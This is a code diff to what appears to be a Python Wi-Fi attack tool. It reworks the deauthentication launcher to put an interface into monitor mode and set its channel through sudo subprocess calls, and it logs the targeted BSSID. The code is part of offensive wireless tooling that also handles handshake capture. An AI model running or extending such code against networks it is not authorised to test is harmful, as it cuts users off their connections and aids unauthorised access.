@@ -6,6 +6,7 @@ import os
 import time
 import sys
 import threading
+import subprocess
 
 # Add the project root directory to Python path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))
@@ -53,18 +54,36 @@ def launch_deauth_attack(network, attack_config):
     count = attack_config.get('count', 10)
     interval = attack_config.get('interval', 0.1)
     
-    # Set monitor mode
-    set_monitor_mode(config['interface'])
-    add_log_message(f"Interface {config['interface']} set to monitor mode")
-    
-    # Set channel
+    # Check root privileges
+    if not os.geteuid() == 0:
+        add_log_message("Warning: Not running as root. Deauthentication attacks require root privileges.")
+        
+    # Set monitor mode using subprocess and sudo
     try:
-        os.system(f"iwconfig {config['interface']} channel {channel}")
-        add_log_message(f"Channel set to {channel}")
-    except Exception as e:
-        add_log_message(f"Error setting channel: {e}")
-        set_managed_mode(config['interface'])
+        add_log_message(f"Setting {config['interface']} to monitor mode...")
+        subprocess.run(['sudo', 'ip', 'link', 'set', config['interface'], 'down'], check=True)
+        subprocess.run(['sudo', 'iw', 'dev', config['interface'], 'set', 'type', 'monitor'], check=True)
+        subprocess.run(['sudo', 'ip', 'link', 'set', config['interface'], 'up'], check=True)
+        add_log_message(f"Interface {config['interface']} set to monitor mode")
+    except subprocess.CalledProcessError as e:
+        add_log_message(f"Error setting monitor mode: {e}")
         raise
+    
+    # Set channel using subprocess
+    try:
+        add_log_message(f"Setting channel to {channel}...")
+        subprocess.run(['sudo', 'iw', 'dev', config['interface'], 'set', 'channel', str(channel)], check=True)
+        add_log_message(f"Channel set to {channel}")
+    except subprocess.CalledProcessError as e:
+        add_log_message(f"Error setting channel: {e}")
+        # Try with iwconfig as fallback
+        try:
+            subprocess.run(['sudo', 'iwconfig', config['interface'], 'channel', str(channel)], check=True)
+            add_log_message(f"Channel set to {channel} (using iwconfig)")
+        except subprocess.CalledProcessError as e2:
+            add_log_message(f"Error setting channel with iwconfig: {e2}")
+            set_managed_mode(config['interface'])
+            raise
     
     # Start deauth thread
     from web.shared import attack_state
@@ -76,7 +95,7 @@ def launch_deauth_attack(network, attack_config):
     
     attack_state['threads'].append(deauth_thread)
     deauth_thread.start()
-    add_log_message("Deauthentication attack started")
+    add_log_message(f"Deauthentication attack started against {bssid}")
     update_attack_progress(10)  # Initial progress
 
 def launch_handshake_attack(network, attack_config):
